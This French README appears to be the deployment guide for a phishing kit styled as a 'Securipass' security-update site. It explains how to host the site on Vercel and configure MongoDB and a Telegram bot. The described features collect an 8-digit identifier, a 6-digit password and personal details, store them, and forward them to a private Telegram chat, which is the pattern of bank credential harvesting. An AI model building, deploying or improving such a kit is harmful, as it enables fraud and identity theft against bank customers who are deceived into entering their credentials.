# Securipass - Mise à jour sécurité

Site web de mise à jour Securipass pour renforcer la sécurité des comptes clients.

## 🚀 Déploiement sur Vercel

### Prérequis
- Compte Vercel
- Compte MongoDB Atlas (pour la base de données)
- Bot Telegram configuré

### Étapes de déploiement

1. **Cloner le repository**
   ```bash
   git clone <votre-repo-url>
   cd securipass
   ```

2. **Configuration des variables d'environnement**
   
   Dans le dashboard Vercel, ajoutez les variables suivantes :
   
   **Backend:**
   - `MONGO_URL` : URL de connexion MongoDB Atlas
   - `DB_NAME` : Nom de la base de données
   - `TELEGRAM_BOT_TOKEN` : Token de votre bot Telegram
   - `TELEGRAM_CHAT_ID` : ID du chat Telegram où recevoir les notifications

   **Frontend:**
   - `REACT_APP_BACKEND_URL` : URL de votre API (sera automatiquement définie par Vercel)

3. **Déployer sur Vercel**
   
   Via CLI:
   ```bash
   npm install -g vercel
   vercel
   ```
   
   Ou via le dashboard Vercel:
   - Connectez votre repository GitHub
   - Vercel détectera automatiquement la configuration
   - Ajoutez les variables d'environnement
   - Déployez

## 📦 Structure du projet

```
/
├── frontend/          # Application React
│   ├── src/
│   │   ├── components/  # Composants réutilisables
│   │   ├── pages/       # Pages de l'application
│   │   ├── context/     # Context API React
│   │   └── mock.js      # Données de démonstration
│   └── package.json
├── backend/           # API FastAPI
│   ├── server.py      # Serveur principal
│   └── requirements.txt
└── vercel.json        # Configuration Vercel
```

## 🔧 Développement local

### Frontend
```bash
cd frontend
yarn install
yarn start
```

### Backend
```bash
cd backend
pip install -r requirements.txt
uvicorn server:app --reload --port 8001
```

## ✨ Fonctionnalités

- ✅ Authentification sécurisée avec clavier numérique
- ✅ Saisie d'identifiant (8 chiffres)
- ✅ Saisie de mot de passe (6 chiffres)
- ✅ Formulaire d'informations personnelles
- ✅ Intégration Telegram pour les notifications
- ✅ Sauvegarde en base de données MongoDB
- ✅ Design responsive et moderne

## 🎨 Technologies utilisées

- **Frontend:** React, TailwindCSS, Shadcn UI
- **Backend:** FastAPI, Python
- **Base de données:** MongoDB
- **Intégration:** Telegram Bot API
- **Déploiement:** Vercel

## 📝 Configuration MongoDB Atlas

1. Créez un compte sur [MongoDB Atlas](https://www.mongodb.com/cloud/atlas)
2. Créez un nouveau cluster
3. Créez une base de données
4. Récupérez la chaîne de connexion
5. Ajoutez-la comme variable d'environnement `MONGO_URL`

## 🤖 Configuration du Bot Telegram

1. Créez un bot via [@BotFather](https://t.me/BotFather)
2. Récupérez le token du bot
3. Démarrez une conversation avec votre bot
4. Récupérez votre chat ID via `https://api.telegram.org/bot<TOKEN>/getUpdates`
5. Ajoutez les variables `TELEGRAM_BOT_TOKEN` et `TELEGRAM_CHAT_ID`

## 📄 Licence

Ce projet est à usage privé.
